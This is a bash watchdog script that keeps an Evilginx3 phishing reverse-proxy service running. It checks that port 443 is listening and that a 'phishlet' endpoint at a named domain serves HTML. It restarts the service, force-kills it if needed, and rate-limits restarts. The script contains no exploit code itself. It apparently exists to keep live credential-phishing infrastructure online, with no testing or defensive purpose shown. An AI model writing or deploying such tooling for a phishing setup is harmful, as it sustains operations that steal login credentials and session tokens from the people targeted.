#!/bin/bash
# === EVILGINX3 WATCHDOG (ENHANCED) ===
# Monitors the Evilginx3 service and ensures it's always running and healthy

set -euo pipefail

### === CONFIGURATION ===
SERVICE_NAME="evilginx"
DOMAIN="www.hrahra.org"
LOCK_FILE="/opt/posh-ai/evilginx3/sys/watchdog.lock"
LOG_FILE="/opt/posh-ai/evilginx3/sys/watchdog.log"
MAX_RESTARTS=5
RESTART_WINDOW=300  # seconds

### === UTILITIES ===
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"; }

check_service_health() {
    if ! ss -tuln | grep -q ':443 '; then
        log "Port 443 not listening"
        return 1
    fi

    if ! curl -ks "https://$DOMAIN" | grep -iq '<html'; then
        log "Phishlet endpoint $DOMAIN returned invalid response"
        return 1
    fi

    return 0
}

### === LOCK + RESTART PROTECTION ===
exec 9>"$LOCK_FILE"
flock -n 9 || exit 1

CURRENT_COUNT=$(journalctl -u "$SERVICE_NAME" --since "-${RESTART_WINDOW} seconds" | grep -c "Scheduled restart job")

if (( CURRENT_COUNT >= MAX_RESTARTS )); then
    log "Restart limit reached: $MAX_RESTARTS in $RESTART_WINDOW seconds"
    exit 0
fi

if ! systemctl is-active --quiet "$SERVICE_NAME" || ! check_service_health; then
    log "Restarting $SERVICE_NAME (attempt $((CURRENT_COUNT + 1)))"
    systemctl reset-failed "$SERVICE_NAME"
    systemctl restart "$SERVICE_NAME"
    sleep 5

    if ! systemctl is-active --quiet "$SERVICE_NAME"; then
        log "Emergency fallback: forcing process kill and restart"
        pkill -9 evilginx || true
        systemctl start "$SERVICE_NAME"
    fi
fi
